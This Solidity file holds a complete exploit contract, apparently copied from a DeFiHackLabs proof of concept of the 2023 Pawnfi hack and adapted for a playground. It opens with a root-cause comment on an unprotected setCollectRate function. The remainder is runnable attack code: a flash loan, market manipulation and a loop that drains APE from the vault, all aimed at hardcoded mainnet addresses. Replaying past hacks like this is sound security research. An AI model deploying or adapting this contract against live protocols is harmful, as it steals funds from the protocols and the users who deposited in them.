// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-Pawnfi).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (attacker = address(this); the flash-loan callback `uniswapV3FlashCallback`
// lives on the test itself), so there is no standalone contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack
// (testExploit -> run, uniswapV3FlashCallback, borrowEth,
// depositBorrowWithdrawApe) so the playground can deploy it and record run().
// Logic and constants are copied verbatim from
// evm-hack-registry/2023-06-Pawnfi_exp/test/Pawnfi_exp.sol.
//
// Root cause: Pawnfi's ApeStaking.setCollectRate() has NO access control, so
// the attacker sets their own collectRate to 100%. ApeStaking's
// depositAndBorrowApeAndStake() stakes ApeCoin that is pulled from the
// P-BAYC vault's own balance (not the caller's) whenever cashAmount/
// borrowAmount are both zero, yet withdrawApeCoin() -> _repayAndClaim()
// hands 100% of the withdrawn principal straight to the caller when
// collectRate == 1e18. Looping deposit(capPerPosition) -> withdraw(same)
// for the same NFT moves capPerPosition APE from the vault to the attacker
// each cycle, with the attacker contributing nothing.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IERC721 {
    function setApprovalForAll(address operator, bool approved) external;
}

interface IUniV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface ICErc20Delegate {
    function mint(uint256 mintAmount) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface ICointroller {
    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface ISimplePriceOracle {
    function getUnderlyingPrice(address rToken) external view returns (uint256);
}

interface IPToken is IERC20 {
    function randomTrade(uint256 nftIdCount) external returns (uint256[] memory nftIds);
}

interface ApeStakingStorage {
    struct DepositInfo {
        uint256[] mainTokenIds;
        uint256[] bakcTokenIds;
    }

    struct StakingInfo {
        address nftAsset;
        uint256 cashAmount;
        uint256 borrowAmount;
    }
}

interface IApeCoinStaking {
    struct SingleNft {
        uint32 tokenId;
        uint224 amount;
    }

    struct PairNftDepositWithAmount {
        uint32 mainTokenId;
        uint32 bakcTokenId;
        uint184 amount;
    }

    struct PairNftWithdrawWithAmount {
        uint32 mainTokenId;
        uint32 bakcTokenId;
        uint184 amount;
        bool isUncommit;
    }

    struct TimeRange {
        uint48 startTimestampHour;
        uint48 endTimestampHour;
        uint96 rewardsPerHour;
        uint96 capPerPosition;
    }
}

interface IApeStaking {
    function depositAndBorrowApeAndStake(
        ApeStakingStorage.DepositInfo memory depositInfo,
        ApeStakingStorage.StakingInfo memory stakingInfo,
        IApeCoinStaking.SingleNft[] memory _nfts,
        IApeCoinStaking.PairNftDepositWithAmount[] memory _nftPairs
    ) external;

    function withdrawApeCoin(
        address nftAsset,
        IApeCoinStaking.SingleNft[] memory _nfts,
        IApeCoinStaking.PairNftWithdrawWithAmount[] memory _nftPairs
    ) external;

    function setCollectRate(uint256 newCollectRate) external;

    function pools(
        uint256
    ) external view returns (uint48 lastRewardedTimestampHour, uint16 lastRewardsRangeIndex, uint96 stakedAmount, uint96 accumulatedRewardsPerShare);

    function getTimeRangeBy(uint256 _poolId, uint256 _index) external view returns (IApeCoinStaking.TimeRange memory);
}

contract PawnfiDrain {
    IUniV3Pool private constant UniV3Pool = IUniV3Pool(0xAc4b3DacB91461209Ae9d41EC517c2B9Cb1B7DAF);
    IERC20 private constant APE = IERC20(payable(0x4d224452801ACEd8B2F0aebE155379bb5D594381));
    ICErc20Delegate private constant sAPE = ICErc20Delegate(payable(0x73625745eD66F0d4C68C91613086ECe1Fc5a0119));
    ICErc20Delegate private constant isAPE = ICErc20Delegate(payable(0x3B2da9304bd1308Dc0d1b2F9c3C14F4CF016a955));
    ICErc20Delegate private constant CEther = ICErc20Delegate(payable(0x37B614714e96227D81fFffBdbDc4489e46eAce8C));
    ICErc20Delegate private constant iPBAYC = ICErc20Delegate(payable(0x9C1c49B595D5c25F0Ccc465099E6D9d0a1E5aB37));
    IPToken private constant PBAYC = IPToken(0x5f0A4a59C8B39CDdBCf0C683a6374655b4f5D76e);
    IERC721 private constant BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
    ICointroller private constant Unitroller = ICointroller(0x0518b21F49548427EF0c16Ff26Ce8a05295F7454);
    ISimplePriceOracle private constant MultipleSourceOracle =
        ISimplePriceOracle(0x01b7234e6b24003e88b4e22d0a8d574432d3dFF6);
    IApeStaking private constant ApeStaking1 = IApeStaking(0x0B89032E2722b103386aDCcaE18B2F5D4986aFa0);
    IApeStaking private constant ApeStaking2 = IApeStaking(0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9);

    // entrypoint: kicks off the flash loan, whose callback runs the whole attack.
    function run() external {
        UniV3Pool.flash(address(this), 200_000 * 1e18, 0, new bytes(1));
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        APE.approve(address(sAPE), APE.balanceOf(address(this)));
        sAPE.mint(APE.balanceOf(address(this)));
        sAPE.approve(address(isAPE), sAPE.balanceOf(address(this)));
        isAPE.mint(sAPE.balanceOf(address(this)));

        address[] memory cTokens = new address[](1);
        cTokens[0] = address(isAPE);
        Unitroller.enterMarkets(cTokens);

        iPBAYC.borrow(1005 * 1e18);
        PBAYC.approve(address(PBAYC), PBAYC.balanceOf(address(this)));
        uint256[] memory nftIds = PBAYC.randomTrade(1);

        BAYC.setApprovalForAll(address(ApeStaking1), true);
        ApeStaking1.setCollectRate(1e18);

        uint256[] memory _mainTokenIds = new uint256[](1);
        _mainTokenIds[0] = nftIds[0];
        uint256[] memory _bakcTokenIds;
        ApeStakingStorage.DepositInfo memory depositInfo =
            ApeStakingStorage.DepositInfo({mainTokenIds: _mainTokenIds, bakcTokenIds: _bakcTokenIds});
        ApeStakingStorage.StakingInfo memory stakingInfo =
            ApeStakingStorage.StakingInfo({nftAsset: address(BAYC), cashAmount: 0, borrowAmount: 0});
        IApeCoinStaking.SingleNft[] memory _nfts;
        IApeCoinStaking.PairNftDepositWithAmount[] memory _nftPairs;
        ApeStaking1.depositAndBorrowApeAndStake(depositInfo, stakingInfo, _nfts, _nftPairs);

        borrowEth();

        for (uint256 i; i < 20; ++i) {
            (, uint16 lastRewardsRangeIndex,,) = ApeStaking2.pools(1);
            IApeCoinStaking.TimeRange memory timeRange = ApeStaking2.getTimeRangeBy(1, lastRewardsRangeIndex);

            depositBorrowWithdrawApe(timeRange.capPerPosition);
        }
        depositBorrowWithdrawApe(APE.balanceOf(address(PBAYC)));
        APE.transfer(address(UniV3Pool), 200_000 * 1e18 + fee0);
    }

    function borrowEth() internal {
        (, uint256 accLiquidity,) = Unitroller.getAccountLiquidity(address(this));
        uint256 cashBalanceEth = CEther.getCash();
        uint256 underlyingPrice = MultipleSourceOracle.getUnderlyingPrice(address(CEther));
        uint256 liquidity = (underlyingPrice * cashBalanceEth) / 1e18;

        if (liquidity <= accLiquidity) {
            CEther.borrow(cashBalanceEth);
        } else {
            uint256 borrowAmount = (accLiquidity * 1e18) / underlyingPrice;
            CEther.borrow(borrowAmount);
        }
    }

    function depositBorrowWithdrawApe(
        uint256 amount
    ) internal {
        uint256[] memory _mainTokenIds;
        uint256[] memory _bakcTokenIds;
        ApeStakingStorage.DepositInfo memory depositInfo =
            ApeStakingStorage.DepositInfo({mainTokenIds: _mainTokenIds, bakcTokenIds: _bakcTokenIds});
        ApeStakingStorage.StakingInfo memory stakingInfo =
            ApeStakingStorage.StakingInfo({nftAsset: address(BAYC), cashAmount: 0, borrowAmount: 0});
        IApeCoinStaking.SingleNft[] memory _nfts = new IApeCoinStaking.SingleNft[](1);
        _nfts[0] = IApeCoinStaking.SingleNft({
            tokenId: 9829, // nftIds[0]
            amount: uint224(amount)
        });
        IApeCoinStaking.PairNftDepositWithAmount[] memory _nftPairs;
        ApeStaking1.depositAndBorrowApeAndStake(depositInfo, stakingInfo, _nfts, _nftPairs);
        IApeCoinStaking.PairNftWithdrawWithAmount[] memory nftPairs_;
        ApeStaking1.withdrawApeCoin(address(BAYC), _nfts, nftPairs_);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
